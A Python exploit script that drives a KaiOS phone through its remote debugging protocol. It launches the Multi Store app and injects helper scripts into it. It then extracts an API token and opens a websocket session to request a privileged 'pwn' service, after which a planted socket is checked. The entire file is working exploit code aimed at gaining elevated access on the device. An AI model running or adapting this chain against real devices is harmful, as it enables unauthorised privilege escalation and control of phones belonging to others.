#!/usr/bin/env python3
"""Synchronous step-by-step exploit — no async."""
import socket, json, sys, time

HOST = '127.0.0.1'
PORT = 5555

class RDP:
	def __init__(self, host, port):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect((host, port))
		self.buf = b''
	def send(self, msg):
		data = json.dumps(msg)
		self.sock.sendall(f"{len(data)}:{data}".encode())
		print(f">>> {json.dumps(msg)[:150]}")
	def recv(self, timeout=10):
		self.sock.settimeout(timeout)
		while True:
			if b':' in self.buf:
				idx = self.buf.index(b':')
				prefix = self.buf[:idx]
				if prefix.isdigit():
					length = int(prefix)
					start = idx + 1; end = start + length
					if len(self.buf) >= end:
						payload = self.buf[start:end]; self.buf = self.buf[end:]
						try: return json.loads(payload)
						except: return None
				else: self.buf = self.buf[idx+1:]; continue
			try:
				data = self.sock.recv(65536)
				if not data: return None
				self.buf += data
			except socket.timeout: return None
	def recv_all(self, timeout=5):
		msgs = []
		while True:
			msg = self.recv(timeout=timeout)
			if msg is None: break
			msgs.append(msg); timeout = 1
		return msgs

	def evalJS(self, target, code):
		"""Evaluate JS and return the result string."""
		self.send({"to": target, "type": "evaluateJS", "text": code})
		msgs = self.recv_all(timeout=30)
		for msg in msgs:
			if isinstance(msg, dict):
				result = msg.get('result')
				exc = msg.get('exception')
				if exc:
					return f"EXCEPTION: {json.dumps(exc)[:500]}"
				if isinstance(result, str):
					return result
				elif result is not None:
					return json.dumps(result)
				else:
					return f"RAW: {json.dumps(msg)[:500]}"
		return "NO RESPONSE"

rdp = RDP(HOST, PORT)
hello = rdp.recv()
rdp.send({"to": "root", "type": "listTabs"})
resp = rdp.recv_all(timeout=5)
webapps_actor = None
for r in resp:
	if isinstance(r, dict):
		webapps_actor = r.get('webappsActor')

# Launch Multi Store
rdp.send({"to": webapps_actor, "type": "launch", "manifestURL": "app://multi.store.bananahackers.net/manifest.webapp"})
rdp.recv_all(timeout=5)
print("Waiting 8s...")
time.sleep(8)

# getAppActor
rdp.send({"to": webapps_actor, "type": "getAppActor", "manifestURL": "app://multi.store.bananahackers.net/manifest.webapp"})
actor_resp = rdp.recv_all(timeout=5)
console_actor = None
for r in actor_resp:
	if isinstance(r, dict) and 'actor' in r and isinstance(r['actor'], dict):
		console_actor = r['actor']['consoleActor']

print(f"console_actor: {console_actor}")

# Step-by-step synchronous exploit
print("\n=== Step 1: Load core.js ===")
result = rdp.evalJS(console_actor, """
(function() {
	return new Promise((resolve) => {
		if (typeof KaiOS !== 'undefined' && KaiOS.core) { resolve('already loaded'); return; }
		var s = document.createElement('script');
		s.src = 'http://127.0.0.1:8081/api/v1/shared/core.js';
		s.onload = () => resolve('loaded: KaiOS=' + typeof KaiOS);
		s.onerror = () => resolve('FAILED to load core.js');
		document.head.appendChild(s);
	});
})()
""")
print(f"  {result}")

# Wait for script to load
time.sleep(2)

print("\n=== Step 2: Load session.js ===")
result = rdp.evalJS(console_actor, """
(function() {
	return new Promise((resolve) => {
		if (typeof lib_session !== 'undefined') { resolve('already loaded'); return; }
		var s = document.createElement('script');
		s.src = 'http://127.0.0.1:8081/api/v1/shared/session.js';
		s.onload = () => resolve('loaded: lib_session=' + typeof lib_session);
		s.onerror = () => resolve('FAILED to load session.js');
		document.head.appendChild(s);
	});
})()
""")
print(f"  {result}")

time.sleep(2)

print("\n=== Step 3: Check prerequisites ===")
result = rdp.evalJS(console_actor, """JSON.stringify({
	KaiOS: typeof KaiOS,
	KaiOS_core: typeof KaiOS !== 'undefined' ? typeof KaiOS.core : 'N/A',
	lib_session: typeof lib_session,
	externalapi: typeof navigator.externalapi,
	getToken: typeof navigator.externalapi !== 'undefined' ? typeof navigator.externalapi.getToken : 'N/A'
})""")
print(f"  {result}")

print("\n=== Step 4: Get the token ===")
result = rdp.evalJS(console_actor, """
(function() {
	return new Promise((resolve) => {
		navigator.externalapi.getToken().then(
			(token) => resolve('TOKEN: ' + token),
			(err) => resolve('TOKEN ERROR: ' + JSON.stringify(err))
		);
	});
})()
""")
print(f"  {result[:200]}")

print("\n=== Step 5: Create session, connect WS, call getService('pwn') ===")
result = rdp.evalJS(console_actor, """
(function() {
	return new Promise((resolve) => {
		var session = new lib_session.Session();
		var state = 'starting';

		session.open_url('ws://127.0.0.1:8081/', null, {
			onsessionconnected: function() {
				state = 'connected';
				// Send getService('pwn')
				try {
					var coreMsg = KaiOS.core.CoreRequest.create({getService: {name: 'pwn'}});
					var content = KaiOS.core.CoreRequest.encodeDelimited(coreMsg).finish();
					var baseMsg = KaiOS.core.BaseMessage.create({service: 0, object: 0, content: content});
					session.send_request(baseMsg, KaiOS.core.CoreResponse).then(
						(resp) => resolve('SUCCESS: ' + JSON.stringify(resp.msg).substring(0, 200)),
						(err) => resolve('REQUEST ERROR: ' + JSON.stringify(err))
					);
				} catch(e) {
					resolve('SEND ERROR: ' + e.message);
				}
			},
			onsessionconnectionerror: function() {
				resolve('WS CONNECTION ERROR');
			},
			onsessiondisconnected: function() {
				if (state !== 'connected') resolve('DISCONNECTED before connected');
			}
		}, false);

		// Timeout after 15s
		setTimeout(() => resolve('TIMEOUT: state=' + state), 15000);
	});
})()
""")
print(f"  {result[:500]}")

print("\n=== DONE — check /data/local/tmp/rsock ===")
rdp.sock.close()